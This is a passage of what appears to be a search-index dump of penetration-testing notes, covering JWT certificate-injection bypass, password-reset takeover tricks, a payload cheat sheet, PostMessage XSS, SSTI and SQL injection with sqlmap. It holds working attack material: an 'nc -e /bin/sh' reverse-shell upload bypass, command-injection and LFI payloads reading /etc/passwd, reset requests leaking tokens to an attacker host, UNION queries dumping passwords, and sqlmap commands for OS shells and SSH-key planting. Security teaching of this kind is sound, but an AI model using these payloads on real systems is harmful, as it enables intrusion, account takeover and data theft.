rcXFkZmRVeGFRYWhEdkVvMytKdzY4eHFRPT0iLCJ0eXAiOiJKV1QiLCJraWQiOiJPRVU1TjBVd1FUZENORFUzUWpBME5VUXhSakJDTjBOQ016UTBOVUZGTWtVeU4wTXpOalZDUWcifQ.eyJpYXQiOjE1NzQ2ODIzNjMsInJvbGUiOiJhdXRoZW50aWNhdGVkIiwiZXhwIjoxNTc0NzY4NzYzfQ.XgPER68yo0T9d5mLOn7ewrPHPRBLeBQHgtyPIHeL6Ph19-mPbhIaHc_XUl3zIzrFFWn4nNoZAnEMwv6OI1IdLsBDdDRWL6WxYdYjp4r17mmV_Ni8cyB5snNnBE8GG6N_E8i8AUiCWNkwsr8YjMujqjvwb7le81Z2Vgb8Nw-LgDLvYUC9Frp3GxvMmE1BKsysz4jv9KLVf04KuNnPkA5BKgJgwF6V-iKHVJAiR6vrRqfzDR_AD5gVkHTp1eTzkgImomo-Z7bZ2THVAPtu8sVyNGyGcGpdBQbFsN2ZxLFgCYUaO-Vuf7bJd6SXJzjRqXDBAz9XX6_pYbBSjMq5pSfIPMZfCUHeyOPv38saEbOBEApMw5SBNISrGC7trjBewWz6yYAPebDSTmBObe-BKowEjSK_mKCevKk1K3sYNzw0E-zatPR30y5PsVIqaqtAdLvF5app55aZSJH9n8dsx3tSZEswuiWShABnHwepyUBUAyPyTIs9BSfupP6qyFIJje8TUSoSMXofXuSCjaP4J7lLyoDO9m1Ezyi3DrURDUFZb8CjUDEDVi-Ct58K-MK7r8_bk71tqHN3E4FhGXX7AwGUztZIQg9UD9gwLv9e8hUT0JCS3eO4xARVbyjoVpgCw2lkc3FarsUm0hIz9KynxyFEGyp92VLWcpxec0nXPGeYMBo\n</code></pre> <p>After decoding you can see various fields n, e, x5c, x5t, kid. Also, notice that kid value is equal to x5t value.</p> <ol> <li>The \u201cx5c\u201d (X.509 certificate chain) Header Parameter contains the X.509 public key certificate or certificate chain corresponding to the key used to digitally sign the JWS.</li> <li>The \u201cx5t\u201d (x.509 certificate thumbprint) header parameter provides a base64url encoded SHA-256 thumbprint (i.e., digest) of the DER encoding of an X.509 certificate that can be used to match a certificate. So, it is analogous to a key identifier or the kid claim!!</li> </ol> <p>Create  a self-signed certificate,</p> <pre><code>openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt\n</code></pre> <p>Now extract the \"n\" and \"e\" values from the certificate,</p> <pre><code>openssl x509 -in attacker.crt -text\n</code></pre> <p>Here the \"Modulus\" is \"n\" and \"exponent\" is \"e\".</p> <p>Now convert the \"Modulus\" to base64 encoded value,</p> <pre><code>echo \"Modulus value\" | sed \u2018s/://g\u2019 | base64 | tr \u2018\\n\u2019 \u2018 \u2018 | sed \u2018s/ //g\u2019 | sed \u2018s/=//g\u2019\n</code></pre> <p>Now do the same for exponent,\"e\"</p> <pre><code>echo 10001 | base64 | sed \u2018s/=//g\u2019\n</code></pre> <p>Now get the value of x5c using the following command,</p> <pre><code>cat attacker.crt | tr \u2018\\n\u2019 \u2018 \u2018 | sed \u2018s/ //g\u2019\n</code></pre> <p>Now calculate the x5t value using the following command,</p> <pre><code>echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | sed \u2018s/SHA1 Fingerprint=//g\u2019 | sed \u2018s/://g\u2019 | base64 | sed \u2018s/=//g\u2019\n</code></pre> <p>Now we have everything we need, Now replace the value in decoded token and signed using generated public and private key. Don't forget to tamper with the payload.</p>"},{"location":"Pentesting/Web%20Application/jwt-and-its-bypass/#jwt-mindmap","title":"JWT Mindmap","text":""},{"location":"Pentesting/Web%20Application/oauth/","title":"OAuth","text":""},{"location":"Pentesting/Web%20Application/oauth/#oauth","title":"OAuth","text":""},{"location":"Pentesting/Web%20Application/oauth/#what-is-oauth","title":"What is OAuth?","text":"<p>OAuth stands for Open Authorization, is a widely used protocol that allows users to grant third-party applications limited access to their resources without sharing their credentials directly. It provides a secure and standardized way for applications to interact with user data on various platforms, such as social media sites or cloud services, without needing to expose sensitive login information. OAuth works by facilitating the exchange of access tokens between the user, the application, and the service provider, enabling seamless authentication and authorization processes while maintaining user privacy and security.</p> <p></p>"},{"location":"Pentesting/Web%20Application/oauth/#reference","title":"Reference","text":"<ul> <li> <p>https://darutk.medium.com/the-simplest-guide-to-oauth-2-0-8c71bd9a15bb</p> </li> <li> <p>https://portswigger.net/web-security/oauth</p> </li> <li> <p>https://medium.com/better-programming/the-complete-guide-to-oauth-2-0-and-openid-connect-protocols-35ebc1cbc11a#:~:text=OAuth%202.0%20is%20used%20for,flow%20for%20browser%2Dbased%20applications.</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/","title":"Password Reset Functionality","text":""},{"location":"Pentesting/Web%20Application/password-reset-functionality/#password-reset-functionality","title":"Password Reset Functionality","text":""},{"location":"Pentesting/Web%20Application/password-reset-functionality/#concept","title":"Concept","text":"<p>In this vulnerability attacker tries to attack the password rest functionality of the application, if the attacker is successful in doing so this might lead to full account takeover, Below are some way to exploit this attack.</p>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#ways-to-bypass","title":"Ways to bypass","text":""},{"location":"Pentesting/Web%20Application/password-reset-functionality/#include-your-email-as-second-parameter","title":"Include your email as second parameter","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\nemail=victim@xyz.com&amp;email=attacker@abc.com\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#brute-force-the-password-reset-token","title":"Brute force the password reset token","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\nemail=victim@xyz.com&amp;token={bruteforce}\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#try-to-use-reset-token-to-victims-account","title":"Try to use reset token to victims account","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\nemail=victim@xyz.com&amp;token={yourtoken}\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#host-header-injection","title":"Host header injection","text":"<ul> <li>Try changing the host, this might lead to passing the token to attackers server</li> </ul> <pre><code>POST \u00a0/reset\n\nHost: Attacker.com\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#try-figuring-how-the-tokens-are-generated","title":"Try figuring how the tokens are generated","text":"<pre><code>Like\n\nThey might be generated based on timestamp.\n\nThey might be generated based on the user id.\n\nThey might be generated based on the email id.\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#crlf-injection","title":"CRLF Injection","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\nemail=\"victim@mail.tld%0a%0dcc:attacker@mail.tld\"\n</code></pre> <pre><code>\u00a0CLRF:\n\n\u00a0POST /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#business-logic","title":"Business logic","text":"<pre><code>While inviting users into your account/organization,\n\nyou can also try inviting company emails and add a new field\n\n\"password\": \"example123\". or \"pass\": \"example123\" in the\n\nrequest. you may end up resetting a user password.\n\n(company email can be found here\n\nhunter.io)\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#json-array","title":"JSON array","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\n{\"email\":[\"victim@mail.tld\",\"atracker@mail.tld\"]}\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#token-leakage-via-refer-header","title":"Token leakage via refer header","text":"<pre><code>POST \u00a0/reset\n\n[....]\n\nReferer:https://xyz.com/token={token}\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#idor-for-password-reset","title":"IDOR for password reset","text":"<ul> <li>we can change the id parameter</li> </ul> <pre><code>POST \u00a0/reset\n\n[....]\n\nid=1234&amp;\n</code></pre>"},{"location":"Pentesting/Web%20Application/password-reset-functionality/#some-other-ways","title":"Some other ways","text":"<ol> <li> <p>Race condition: Exploit timing dependencies to manipulate password reset processes.</p> </li> <li> <p>Completely remove the token: Attempt reset without providing a valid token.</p> </li> <li> <p>Change token to all zeroes: Try resetting with a token composed entirely of zeroes.</p> </li> <li> <p>Use null/nil value: Provide null or nil instead of a valid token.</p> </li> <li> <p>Try expired token: Attempt to use a token that has already expired.</p> </li> <li> <p>Reuse old password reset token: Use a previously used token for reset.</p> </li> <li> <p>Try an array of old tokens: Attempt reset with multiple old tokens simultaneously.</p> </li> <li> <p>Modify token slightly: Alter token characters to check for validation weaknesses.</p> </li> <li> <p>Use Unicode to spoof email: Exploit Unicode characters to manipulate email addresses.</p> </li> <li> <p>Manipulate email format: Attempt to include multiple addresses or special characters in the email field.</p> </li> <li> <p>Change request method/content type: Modify HTTP request methods or content types during the reset process.</p> </li> <li> <p>Manipulate server response: Intercept and alter server responses during reset attempts.</p> </li> <li> <p>Use super long input: Provide excessively long inputs to exploit validation or buffer overflow vulnerabilities.</p> </li> </ol>"},{"location":"Pentesting/Web%20Application/payloads/","title":"Payloads","text":""},{"location":"Pentesting/Web%20Application/payloads/#payloads","title":"Payloads","text":"<p>Checking HTTP Methods</p> <pre><code>curl -i -X OPTIONS http://XXXXnmap --script http-methods --script-args http-methods.url-path='/test' $ipCurl usagecurl -X POST http://internal-01.bart.htb/simple_chat/register.php -d \"uname=0xdf&amp;passwd=password\"\n</code></pre> <p>Shell via Put Method</p> <pre><code>Put Shellcurl -X PUT -T \"/path/to/file\" \"http://myputserver.com/puturl.tmp\"curl -X MOVE --header \u00a0\"Destination:http://ip/asp.asp\" \"http://ip/asp.txt\"\n</code></pre> <p>RFI</p> <pre><code>$ fimap -u \"http://$ip/example.php?test=\"$ https://github.com/lightos/Panoptic/\n</code></pre> <p>JBOSS</p> <pre><code>JMX Console http://$ip:8080/jmxconcole/\u200b\n</code></pre> <p>Tomcat Manager Default Credentials</p> <pre><code>Tomcat manager, try default credentials: tomcat/tomcat, admin/manager, admin/password, admin/s3cret, admin (emtpy password).\u200b\n</code></pre> <p>Command Injection</p> <pre><code>Command injection`id`| id&amp;&amp; iderror || id%0a id\n</code></pre> <p>File upload bypass</p> <pre><code>content-type:image/gifGIF89a ?ippsec=nc -e /bin/sh ip port\n</code></pre> <p>SQL Shell</p> <pre><code>msql -u root -p\\! /bin/sh\n</code></pre> <p>LFI</p> <pre><code>\u00a0Linux../../../../../../../../../../etc/passwd..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd../../../../../../../../../../etc/passwd%00..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%2500\u200bWindows../../../../../../../../../../boot.ini..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini../../../../../../../../../../boot.ini%00..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%2500Wordlists/usr/share/wordlists/SecLists/Fuzzing/JHADDIX_LFI.txt\n</code></pre> <p>LFI Wrappers</p> <pre><code>LFI Wrappersexpect://http://x.x.x.x/blah?parameter=expect://whoamidata://http://x.x.x.x/blah?parameter=data://text/plain;base64,PD8gcGhwaW5mbygpOyA/Pg==# the base64 encoded payload is: input://http://x.x.x.x/blah?parameter=php://input# POST data (using Hackbar)\n</code></pre> <p>LFI to RCE</p> <pre><code>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20inclusion#wrapper-data\u200b\n</code></pre> <p>SSRF</p> <pre><code>for i in $(seq 1 60000); do echo $i; curl -X GET http://ip:60000/url.php?path=http://localhost:$i/ 2&gt; /dev/null | tr -d \u201c\\n\u201d; done\u200b\n</code></pre>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/","title":"PostMessage Vulnerabilities","text":""},{"location":"Pentesting/Web%20Application/postmessage-vuls/#postmessage-vulnerabilities","title":"PostMessage Vulnerabilities","text":""},{"location":"Pentesting/Web%20Application/postmessage-vuls/#concept","title":"Concept","text":"<p>The PostMessage API is an alternative to JSONP, XHR with CORS headers requests that enable sending data between origins. To understand PostMessage you need to know cross-origin communication in modern browsers.</p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#cross-origin-communication","title":"Cross-origin Communication","text":"<p>Modern web browsers employ an important security mechanism known as the Same Origin Policy (SOP) that acts as a security boundary between web pages loaded from different \u201corigins\u201d.</p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#same-origin-policy","title":"Same Origin Policy","text":"<p>The same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin.  Two URLs have the same origin if the protocol, port (if specified), and host are the same for both.  </p> <p>The following table gives examples of origin comparisons with the URL <code>http://store.company.com/dir/page.html</code></p> URL Outcome Reason <code>http://store.company.com/dir2/other.html</code> Same Origin Only the Path differs <code>http://store.company.com/dir/inner/another.html</code> Same Origin Only the Path differs <code>https://store.company.com/page.html</code> Failure Different protocol <code>http://store.company.com:81/dir/page.html</code> Failure Different port <code>http://news.company.com/dir/page.html</code> Failure Different host"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#postmessage","title":"PostMessage()","text":"<p>The <code>window.postMessage()</code> method safely enables cross-origin communication between <code>Window</code> objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it. </p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#syntax","title":"Syntax","text":"<pre><code>targetWindow.postMessage(message, targetOrigin, [transfer]);\n</code></pre>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#sending-a-message","title":"Sending a Message","text":"<pre><code>targetWindow.postMessage(\"unstable was here\", \"*\");\n</code></pre>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#receiving-a-message","title":"Receiving a message","text":"<pre><code>window.addEventListener(\"message\", function(message){console.log(message.data)});\n</code></pre> <p>To send a message application calls \"PostMessage\" function with a message and target origin which in this case is a wildcard.</p> <p>At the receiving end, a \"message\" event handler can be used. </p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#vulnerabilities","title":"Vulnerabilities","text":"<p>If PostMessage is not implemented correctly it can lead to Cross-site scripting vulnerabilities or in some cases information disclosure.</p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#how-to-test","title":"How to test?","text":""},{"location":"Pentesting/Web%20Application/postmessage-vuls/#xss","title":"XSS","text":"<p>Most of the time XSS arises when at receiving end there is no validation of an origin. So if you don't see the following origin validation code at the receiver end there might be a chance for XSS.</p> <pre><code>window.addEventListener(\"message\", (event)=&gt;{\n    if (event.origin !== \"http://safe.com\")\n    return;\n    ...\n}\n</code></pre> <p>Also at the parent window, the target origin must be set to a wildcard to perform the XSS.</p> <pre><code>targetWindow.postMessage(\"xss\", \"*\");\n</code></pre> <p> When there is no validation on the child window an attacker can host a different webpage with the XSS payload as per the functionality.</p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#detection","title":"Detection","text":"<p>The way to detect PostMessage vulnerabilities is to read the javascript code. There are some tools that can help you to some extent. The easiest way is to use the developer console. You can find this under sources -&gt; Global Listeners. The other tools like PMHook with TamperMonkey can be used.</p>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#tools","title":"Tools","text":"<ul> <li> <p>https://sentinel.appcheck-ng.com/static/pm/replay.html</p> </li> <li> <p>https://tools.honoki.net/postmessage.html</p> </li> <li> <p>https://github.com/benso-io/posta</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/postmessage-vuls/#references","title":"References","text":"<ul> <li> <p>https://jlajara.gitlab.io/web/2020/06/12/Dom_XSS_PostMessage.html</p> </li> <li> <p>https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html</p> </li> <li> <p>https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/race-conditions/","title":"Race Conditions","text":""},{"location":"Pentesting/Web%20Application/race-conditions/#race-conditions","title":"Race Conditions","text":""},{"location":"Pentesting/Web%20Application/race-conditions/#what-is-race-condition","title":"What is Race Condition?","text":"<p>Race conditions is a vulnerability that occur in concurrent systems, where the behaviour of the system depends on the sequence or timing of events. These vulnerabilities arise when multiple threads or processes attempt to modify shared resources concurrently without proper synchronization, leading to unpredictable or unintended outcomes.</p>"},{"location":"Pentesting/Web%20Application/race-conditions/#different-attack-types","title":"Different Attack types","text":"<p>1. Boundary exceeding race conditions Boundary exceeding race conditions occur when multiple processes or threads attempt to surpass predefined constraints established by an application's operational rules at the same time. An attacker can send multiple requests concurrently, by aiming to exploit the short time intervals between the validation of rules and their actual application. </p> <p>2. Single-endpoint race condition In a single-endpoint race condition, attackers exploit vulnerabilities where multiple processes or threads compete for control over the same endpoint or resource simultaneously. In a collaborative document editing platform where multiple users can simultaneously edit a document, a single-endpoint race condition can occur, posing challenges to data integrity and collaborative efforts. </p> <p>3. Multi-endpoint Race condition Multi-endpoint Race condition in web applications is a vulnerability where simultaneous requests to different endpoints can lead to unexpected behavior due to the lack of proper synchronization or locking mechanisms. This can result in inconsistent or erroneous data processing, potentially allowing attackers to manipulate the application's state or access unauthorized information.</p> <p>4. Time sensitive attack A time-sensitive race condition in web applications occurs when multiple processes compete to access or modify shared resources within a specific timeframe. This vulnerability arises due to the unpredictability of process execution times, leading to inconsistent or unintended behavior. Attackers can exploit this by manipulating the timing of requests to gain unauthorized access, bypass security measures, or cause data corruption.</p>"},{"location":"Pentesting/Web%20Application/race-conditions/#tool","title":"Tool","text":"<ul> <li>Turbo Intruder - https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988</li> </ul>"},{"location":"Pentesting/Web%20Application/race-conditions/#reference","title":"Reference","text":"<ul> <li> <p>https://portswigger.net/web-security/race-conditions </p> </li> <li> <p>https://youtu.be/4T99v957I0o</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/redirects/","title":"Open Redirection","text":""},{"location":"Pentesting/Web%20Application/redirects/#open-redirection","title":"Open Redirection","text":""},{"location":"Pentesting/Web%20Application/redirects/#what-is-open-redirection","title":"What is Open Redirection?","text":"<p>Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.</p>"},{"location":"Pentesting/Web%20Application/redirects/#references","title":"References","text":"<ul> <li> <p>https://www.youtube.com/watch?v=4Jk_I-cw4WE</p> </li> <li> <p>https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/</p> </li> <li> <p>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/understanding-and-discovering-open-redirect-vulnerabilities/</p> </li> <li> <p>https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/response-manipulation/","title":"Response manipulation","text":""},{"location":"Pentesting/Web%20Application/saml-sso/","title":"SAML/SSO","text":""},{"location":"Pentesting/Web%20Application/saml-sso/#samlsso","title":"SAML/SSO","text":""},{"location":"Pentesting/Web%20Application/saml-sso/#what-is-samlsso","title":"What is SAML\\SSO?","text":"<p>SAML (Security Assertion Markup Language) and SSO (Single Sign-On) are technologies used in identity and access management systems. SAML facilitates secure communication between identity providers (like login systems) and service providers (like web applications), allowing users to access multiple services with a single set of credentials. SSO, on the other hand, enables users to log in once and gain access to multiple connected systems without re-entering credentials. Together, SAML and SSO streamline authentication processes, enhance security, and improve user experience across various applications and services.</p>"},{"location":"Pentesting/Web%20Application/saml-sso/#blogs","title":"Blogs","text":"<ul> <li> <p>https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/</p> </li> <li> <p>https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/</p> </li> <li> <p>https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/</p> </li> <li> <p>https://github.com/kelbyludwig/saml-attack-surface</p> </li> <li> <p>http://secretsofappsecurity.blogspot.com/2017/01/saml-security-xml-external-entity-attack.html</p> </li> <li> <p>https://seanmelia.wordpress.com/2016/01/09/xxe-via-saml/</p> </li> <li> <p>https://hackerone.com/reports/136169</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/sensitive-information-disclosure/","title":"Sensitive Information Disclosure","text":""},{"location":"Pentesting/Web%20Application/sensitive-information-disclosure/#sensitive-information-disclosure","title":"Sensitive Information Disclosure","text":""},{"location":"Pentesting/Web%20Application/sensitive-information-disclosure/#description","title":"Description","text":"<p>Information disclosure is when an application fails to properly protect sensitive and confidential information from exposure to users who are not normally supposed to have access to that data.</p> <p>Different types of information disclosure issues</p> <ol> <li>Banner Grabbing: Banner grabbing is a process of collecting information like operating system, server details, the name of service running with its version number, and a lot of information about it.</li> <li>Source Code Disclosure: Source code disclosure issues occur when the code of the backend environment of a web application is exposed to the public.</li> <li>File Name and File Path Disclosure: This can happen due to incorrect handling of user input, exceptions at the back-end, or inappropriate configuration of the webserver. Sometimes such information can be found or identified in the responses of the web applications, error pages, debugging information, etc.</li> <li>Inappropriate Handling of Sensitive Data: This can happen when sensitive data is not removed from the source code or somewhere else. Some data like username, password, or some important comment can be present there which may reveal some sensitive data. There are lots of other possibilities.</li> </ol> <p>Common sources of information Disclosure</p> <ul> <li>Error messages</li> <li>Debug messages</li> <li>Backup files</li> <li>Developer comments in HTML source code</li> <li>Server and database messages</li> <li>Using public information</li> </ul>"},{"location":"Pentesting/Web%20Application/sensitive-information-disclosure/#references","title":"References","text":"<p>https://infosecwriteups.com/all-about-information-disclosure-5edb5459a514</p>"},{"location":"Pentesting/Web%20Application/server-side-template-injection-ssti/","title":"Server-Side Template Injection (SSTI)","text":""},{"location":"Pentesting/Web%20Application/server-side-template-injection-ssti/#server-side-template-injection-ssti","title":"Server-Side Template Injection (SSTI)","text":""},{"location":"Pentesting/Web%20Application/server-side-template-injection-ssti/#what-is-ssti","title":"What is SSTI?","text":"<p>SSTI stands for Server-Side Template Injection, a web application vulnerability that occurs when an attacker is able to inject malicious code into a server-side template engine. This allows them to execute arbitrary code within the context of the server, potentially leading to data theft, unauthorized access, or server compromise. SSTI vulnerabilities commonly arise when input from users is not properly sanitized or validated before being passed to the template engine, enabling attackers to manipulate the template rendering process. </p> <p></p>"},{"location":"Pentesting/Web%20Application/server-side-template-injection-ssti/#ssti-handbook","title":"SSTI Handbook","text":"<ul> <li>SSTI Handbook</li> </ul>"},{"location":"Pentesting/Web%20Application/server-side-template-injection-ssti/#references","title":"References","text":"<ul> <li> <p>https://www.youtube.com/watch?v=SN6EVIG4c-0&amp;feature=youtu.be</p> </li> <li> <p>https://app.box.com/s/jakkldv0tjgc07f9cu0i5euktcwob7b9</p> </li> <li> <p>https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti#</p> </li> <li> <p>https://github.com/TeamGreyFang/CTF-Writeups/blob/master/VolgaCTF2020/Web-Newsletter/README.md</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</p> </li> <li> <p>https://portswigger.net/web-security/server-side-template-injection</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/sql-injection/","title":"SQL Injection","text":""},{"location":"Pentesting/Web%20Application/sql-injection/#sql-injection","title":"SQL Injection","text":""},{"location":"Pentesting/Web%20Application/sql-injection/#what-is-sql-injection","title":"What is SQL Injection?","text":"<p>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</p>"},{"location":"Pentesting/Web%20Application/sql-injection/#types","title":"Types","text":"<ul> <li>Union-based SQLi</li> <li>Error-based SQLi</li> <li>Blind SQLi</li> <li>Boolean-based (content-based) Blind SQLi</li> <li>Time-based Blind SQLi</li> </ul>"},{"location":"Pentesting/Web%20Application/sql-injection/#entry-point-detection","title":"Entry point detection","text":"<p>Detection of an SQL injection entry point Simple characters</p> <pre><code>'\n%27\n\"\n%22\n# ****\n%23\n;\n%3B\n)\nWildcard (*)\n&amp;apos;  # required for XML content\n</code></pre> <p>Multiple encoding</p> <pre><code>%%2727\n%25%27\n</code></pre> <p>Merging characters</p> <pre><code>`+HERP\n'||'DERP\n'+'herp\n' 'DERP\n'%20'HERP\n'%2B'HERP\n</code></pre> <p>Logic Testing</p> <pre><code>page.asp?id=1 or 1=1 -- true\npage.asp?id=1' or 1=1 -- true\npage.asp?id=1\" or 1=1 -- true\npage.asp?id=1 and 1=2 -- false\n</code></pre> <p>Weird characters</p> <pre><code>Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was\ntransformed into U+0022 QUOTATION MARK (\")\nUnicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was\ntransformed into U+0027 APOSTROPHE (')\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#dbms-identification","title":"DBMS Identification","text":"<pre><code>[\"conv('a',16,2)=conv('a',16,2)\"                   ,\"MYSQL\"],\n[\"connection_id()=connection_id()\"                 ,\"MYSQL\"],\n[\"crc32('MySQL')=crc32('MySQL')\"                   ,\"MYSQL\"],\n[\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\"       ,\"MSSQL\"],\n[\"@@CONNECTIONS&gt;0\"                                 ,\"MSSQL\"],\n[\"@@CONNECTIONS=@@CONNECTIONS\"                     ,\"MSSQL\"],\n[\"@@CPU_BUSY=@@CPU_BUSY\"                           ,\"MSSQL\"],\n[\"USER_ID(1)=USER_ID(1)\"                           ,\"MSSQL\"],\n[\"ROWNUM=ROWNUM\"                                   ,\"ORACLE\"],\n[\"RAWTOHEX('AB')=RAWTOHEX('AB')\"                   ,\"ORACLE\"],\n[\"LNNVL(0=123)\"                                    ,\"ORACLE\"],\n[\"5::int=5\"                                        ,\"POSTGRESQL\"],\n[\"5::integer=5\"                                    ,\"POSTGRESQL\"],\n[\"pg_client_encoding()=pg_client_encoding()\"       ,\"POSTGRESQL\"],\n[\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"],\n[\"quote_literal(42.5)=quote_literal(42.5)\"         ,\"POSTGRESQL\"],\n[\"current_database()=current_database()\"           ,\"POSTGRESQL\"],\n[\"sqlite_version()=sqlite_version()\"               ,\"SQLITE\"],\n[\"last_insert_rowid()&gt;1\"                           ,\"SQLITE\"],\n[\"last_insert_rowid()=last_insert_rowid()\"         ,\"SQLITE\"],\n[\"val(cvar(1))=1\"                                  ,\"MSACCESS\"],\n[\"IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0\"               ,\"MSACCESS\"],\n[\"cdbl(1)=cdbl(1)\"                                 ,\"MSACCESS\"],\n[\"1337=1337\",   \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n[\"'i'='i'\",     \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#dumping-the-database-manual","title":"Dumping the Database (Manual)","text":"<ul> <li>Extract the table names</li> </ul> <p><code>union all select table_name from information</code><code>_</code><code>schema.tables</code></p> <ul> <li>group_concat() can be used to extract all the data at once.</li> </ul> <p><code>union all select group_concat(table_name) from information</code><code>_</code><code>schema.tables</code></p> <p>above query will return all the tables present in the database.</p> <ul> <li>Extract columns</li> </ul> <p><code>union all select group_concat(column_name1),group_conat(column_name2) from information</code><code>_</code><code>schema.tables where table_name='tablename'</code></p> <ul> <li>Extract data</li> </ul> <p><code>union all select group_concat(username),group_conat(passwords) from tablename</code></p>"},{"location":"Pentesting/Web%20Application/sql-injection/#sql-injection-using-sqlmap","title":"SQL injection using SQLmap","text":""},{"location":"Pentesting/Web%20Application/sql-injection/#basic-arguments-for-sqlmap","title":"Basic arguments for SQLmap","text":"<pre><code>sqlmap --url=\"&lt;url&gt;\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#load-a-request-file-and-use-mobile-user-agent","title":"Load a request file and use mobile user-agent","text":"<pre><code>sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#custom-injection-in-useragentheaderreferercookie","title":"Custom injection in UserAgent/Header/Referer/Cookie","text":"<pre><code>python sqlmap.py -u \"http://example.com\" --data \"username=admin&amp;password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\nThe injection is located at the '*'\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#second-order-injection","title":"Second order injection","text":"<pre><code>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\nsqlmap -r 1.txt -dbms MySQL -second-order \"http://&lt;IP/domain&gt;/joomla/administrator/index.php\" -D \"joomla\" -dbs\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#shell","title":"Shell","text":"<pre><code>SQL Shell\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --sql-shell\n\nSimple Shell\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-shell\n\nDropping a reverse-shell / meterpreter\npython sqlmap.py -u \"http://example.com/?id=1\"  -p id --os-pwn\n\nSSH Shell by dropping an SSH key\npython sqlmap.py -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/\n</code></pre>"},{"location":"Pentesting/Web%20Application/sql-injection/#crawl-a-website-with-sqlmap-and-auto-exploit","title":"Crawl a website with SQLmap and auto-exploit","text":"<pre><code>sqlmap 